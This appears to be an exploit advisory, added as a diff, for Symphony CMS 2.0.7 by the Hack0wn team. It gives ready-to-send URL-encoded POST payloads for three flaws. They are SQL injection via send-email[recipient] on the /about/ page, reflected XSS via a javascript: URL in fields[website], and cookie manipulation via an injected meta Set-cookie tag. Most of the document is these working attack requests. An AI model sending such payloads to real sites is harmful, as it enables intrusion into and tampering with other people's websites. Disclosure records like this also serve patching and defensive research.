@@ -1,0 +1,46 @@
+Symphony 2.0.7 Multiple Vulnerabilities
+bug found by Jose Luis Gongora Fernandez (a.k.a) JosS
+ 
+contact: sys-project[at]hotmail.com
+website: http://www.hack0wn.com/
+ 
+- download: http://downloads.symphony-cms.com/symphony-package/36030/symphony-2.0.7.zip
+ 
+- CMS:
+ 
+ XSLT-powered open source content management system.
+
+~ [SQL]
+
+ This vulnerability affects /symphony-2.0.7/about/.
+
+ The POST variable send-email[recipient] is vulnerable. 
+    send-email[recipient]='
+
+fields%5Bname%5D=111-222-1933email@address.tst&fields%5Bemail%5D=111-222-1933email@address.tst&fields%5Bsubject%5D=General%20Enquiry&fields%5Bmessage%5D=111-222-1933email@address.tst&send-email%5Brecipient%5D='&send-email%5Bsender-email%5D=fields%5Bemail%5D&send-email%5Bsender-name%5D=fields%5Bname%5D&send-email%5Bsubject%5D=fields%5Bsubject%5D&send-email%5Bbody%5D=fields%5Bmessage%5D%2Cfields%5Bsubject%5D%2Cfields%5Bemail%5D%2Cfields%5Bname%5D&action%5Bsave-message%5D=Send
+
+~ [XSS]
+
+ This vulnerability affects /symphony-2.0.7/articles/a-primer-to-symphony-2s-default-theme/.
+
+ The POST variable fields[website] is vulnerable.
+    fields[Bwebsite]=javascript:alert('JosS')
+
+fields%5Bauthor%5D=111-222-1933email@address.tst&fields%5Bemail%5D=111-222-1933email@address.tst&fields%5Bwebsite%5D=javascript:alert(418231608845)&fields%5Bcomment%5D=111-222-1933email@address.tst&fields%5Barticle%5D=3&action%5Bsave-comment%5D=Post%20Comment
+
+~ [Cookie Manipulation]
+
+ This vulnerability affects /symphony-2.0.7/about/.
+
+ The POST variable send-email[recipient] is vulnerable.
+    send-email%5Brecipient%5D=<meta+http-equiv='Set-cookie'+content='cookiename=cookievalue'>
+
+fields%5Bname%5D=111-222-1933email@address.tst&fields%5Bemail%5D=111-222-1933email@address.tst&fields%5Bsubject%5D=General%20Enquiry&fields%5Bmessage%5D=111-222-1933email@address.tst&send-email%5Brecipient%5D=<meta+http-equiv='Set-cookie'+content='cookiename=cookievalue'>&send-email%5Bsender-email%5D=fields%5Bemail%5D&send-email%5Bsender-name%5D=fields%5Bname%5D&send-email%5Bsubject%5D=fields%5Bsubject%5D&send-email%5Bbody%5D=fields%5Bmessage%5D%2Cfields%5Bsubject%5D%2Cfields%5Bemail%5D%2Cfields%5Bname%5D&action%5Bsave-message%5D=Send
+
+
+------------
+Hack0wn Team
+By: JosS
+------------
+
+__h0__
